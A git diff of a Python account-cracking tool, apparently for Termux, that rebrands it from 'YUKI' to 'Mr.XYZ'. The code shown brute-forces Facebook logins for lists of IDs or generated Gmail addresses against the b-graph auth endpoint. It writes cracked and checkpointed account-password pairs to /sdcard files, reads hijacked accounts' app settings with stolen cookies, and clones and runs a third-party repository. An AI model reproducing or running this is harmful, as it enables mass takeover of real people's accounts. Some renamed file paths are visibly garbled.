@@ -1,4 +1,4 @@
- ####@-----Import-----@####
+####@-----Import-----@####
 import os,base64
 
 os.system('git pull -q;rm .rndm')
@@ -68,41 +68,38 @@ Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, l
 ua=[]
 
 ##Logo##
-W = '\033[97;1m'
-R = '\033[91;1m'
-G = '\033[92;1m'
-Y = '\033[93;1m'
-B = '\033[94;1m'
-P = '\033[95;1m'
-C = '\033[96;1m'
+P = '\x1b[1;97m'
+G='\x1b[1;92m'
+R='\x1b[1;91m'
+S ='\x1b[1;96m'
+Y ='\x1b[1;93m'
+uu ='\x1b[1;95m'
 tred = speed
 
 	
 logo= f'''
- \033[1;32m███     █▄ \033[1;30m     ▄█   ▄█▄ \033[1;92m ▄█            H
- \033[1;32m███    ███ \033[1;30m   ███ ▄███▀ \033[1;92m ███               
- \033[1;32m███     ███ \033[1;30m   ███▐██▀ \033[1;92m   ███▌           I
- \033[1;32m███    ███ \033[1;30m  ▄█████▀ \033[1;92m    ███▌             
- \033[1;32m███   ███  \033[1;30m▀▀█████▄ \033[1;92m    ███▌           R
- \033[1;32m███    ███ \033[1;30m   ███▐██▄ \033[1;92m   ███  
- \033[1;32m███     ███ \033[1;30m   ███ ▀███▄  \033[1;92m███            A
- \033[1;32m████████▀ \033[1;30m    ███   ▀█▀ \033[1;92m █▀   
- \033[1;32m             ▀                                                                                                                                                 
-\033[1;93m=================================
-\033[1;97m Owner  : Yuki.
-\033[1;97m GitHub : Yuki-404.
-\033[1;97m Version:\033[1;92m 0.8 \033[1;97m.
-\033[1;97m Status : Free.
-\033[1;97m Notice : Use 10007/10006 For More OK ids.
-\033[1;93m=================================
+{G}███╗   ███╗██████╗    ██╗  ██╗██╗   ██╗███████╗
+{R}████╗ ████║██╔══██╗   ╚██╗██╔╝╚██╗ ██╔╝╚══███╔╝
+{Y}██╔████╔██║██████╔╝    ╚███╔╝  ╚████╔╝   ███╔╝ 
+{S}██║╚██╔╝██║██╔══██╗    ██╔██╗   ╚██╔╝   ███╔╝  
+{G}██║ ╚═╝ ██║██║  ██║██╗██╔╝ ██╗   ██║   ███████╗
+{R}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
+\033[1;93m==================================================
+\033[1;97m Owner : Mr.Biju 4.0
+\033[1;97m Facebook : Mr.BiJu
+\033[1;97m Github : Bijoy Chowdhury
+\033[1;97m Status : Free/Local
+\033[1;97m Version:\033[1;92m 3.0 \033[1;97m
+\033[1;97m Notice : Use 10007/10006 For More OK IDz
+\033[1;93m==================================================
 '''
 
 ####@-----Menu-----@####
-def YUKI_Main():
+def Hxw_Main():
     os.system("clear")
     print(logo)
     print(f"{oo(1)}File Cloning")
-    print(f"{oo(2)}Random Cloning")
+    print(f"{oo(2)}Pak Random Cloning")
     print(f"{oo(3)}Gmail Cloning")  
     print(f"{oo(4)}Create File")
     print(f"{oo(0)}Exit")
@@ -114,7 +111,7 @@ def YUKI_Main():
         gmail()
     if inpp == "4":
      print(f'{oo("+")}Loading Best File Create Command ')
-     os.system('cd && git clone --depth=1 https://github.comHANNAN-404/FILE')
+     os.system('cd && git clone --depth=1 https://github.com/Mr.XYZ-404/FILE')
      os.system('cd && cd FILE ;python FILE.py')
      exit()
     if inpp == "0":
@@ -128,7 +125,7 @@ def file():
     os.system("clear")
     print(logo)
     if 'gm' in l:
-        file = '.YUKI'
+        file = '.Mr.XYZ'
     else:
         file = input(f"{oo('-')}Enter File: ")
     try:
@@ -136,7 +133,7 @@ def file():
             accounts.append(x.strip())
     except:
         print(f"{oo('!')}File Not Found");time.sleep(1)
-        YUKI_Main()
+        Hxw_Main()
      
     method()
     exit()
@@ -153,7 +150,7 @@ def check(session,coki):
     	pass
     else:
         for gm in game:
-            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' YUKI-code=YUKI-33'))
+            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=Mr.XYZ-33'))
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -162,13 +159,13 @@ def check(session,coki):
         pass
     else:
         for gm in game:
-            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','YUKI-182^)Code=YUKI-2233]'))
+            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=Mr.XYZ-2233]'))
 
 
 ####@-----Gmail-----@####
 
 def gmail():     
-        os.system('rm -rf .YUKI')
+        os.system('rm -rf .Mr.XYZ')
         first = input(f'{oo("?")}Put First Name: ')
         last = input(f'{oo("?")}Put Last Name: ')
         domain = input(f'{oo("?")}Put Domain: ')
@@ -181,11 +178,11 @@ def gmail():
             lchoice = random.choice(lists)
             if '3' in lchoice:
                 mail = ''.join(random.choice(string.digits) for _ in range(3))
-                open('.YUKI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                open('.Mr.XYZ','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
             else:
                 mail = ''.join(random.choice(string.digits) for _ in range(4))
-                open('.YUKI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-            fo = open('.YUKI', 'r').read().splitlines()
+                open('.Mr.XYZ','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+            fo = open('.Mr.XYZ', 'r').read().splitlines()
         with tred(max_workers=30) as king___xd:
             tl = str(len(fo))
             tk = first+last
@@ -270,7 +267,7 @@ def method():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait As You Can :)")
-    print(f"{oo('•')}/sdcard/YUKI-OK.txt")
+    print(f"{oo('•')}/sdcard/sexy-4G.txt")
     print('\033[1;93m='*25)
     print()
     
@@ -286,7 +283,7 @@ def method():
         except:
            last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mYUKI-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
             heads = None
@@ -298,8 +295,8 @@ def method():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mYUKI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/YUKI-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mMr.XYZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/Mr.XYZ-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -312,9 +309,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mYUKI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mMr.XYZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/YUKI-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/Mr.XYZ-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -336,7 +333,7 @@ def method():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mYUKI-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = None
@@ -347,8 +344,8 @@ def method():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mYUKI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/YUKI-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mMr.XYZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/Mr.XYZ-OK.txt','a').write(f'{acc} • {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -364,9 +361,9 @@ def method():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mYUKI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mMr.XYZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/YUKI-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/Mr.XYZ-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -418,7 +415,7 @@ def andom():
     print('\033[1;93m='*25)
     print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
     print(f"{oo('-')}Wait As You Can :)")
-    print(f"{oo('•')}/sdcard/YUKI-OK.txt")
+    print(f"{oo('•')}/sdcard/Mr.XYZ-OK.txt")
     print('\033[1;93m='*25)
     print()    
     def start(user):
@@ -433,7 +430,7 @@ def andom():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mYUKI-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mMr.XYZ-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
             heads = None
@@ -445,8 +442,8 @@ def andom():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mYUKI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/YUKI-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mMr.XYZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/Mr.XYZ-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -459,9 +456,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mYUKI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
+                     print('\r\033[1;91m[\033[1;97mMr.XYZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                 cpacc.append(acc)
-                open('/sdcard/YUKI-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/Mr.XYZMr.XYZ-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -484,7 +481,7 @@ def andom():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r\033[1;91m[\033[1;97mYUKI-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = None
@@ -495,8 +492,8 @@ def andom():
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mYUKI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/YUKI-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mMr.XYZ-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/Mr.XYZ.txt','a').write(f'{acc} • {pword}\n')
                 if 'y' in apps:
                 	check(r,coki)
                 if c=='y':
@@ -512,9 +509,9 @@ def andom():
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;91m[\033[1;97mYUKI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
+                     print('\r\033[1;91m[\033[1;97mMr.XYZ-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                 cpacc.append(acc)
-                open('/sdcard/YUKI-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/Mr.XYZ-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -538,5 +535,4 @@ def andom():
 
 
 
-
-YUKI_Main()
+Hxw_Main()
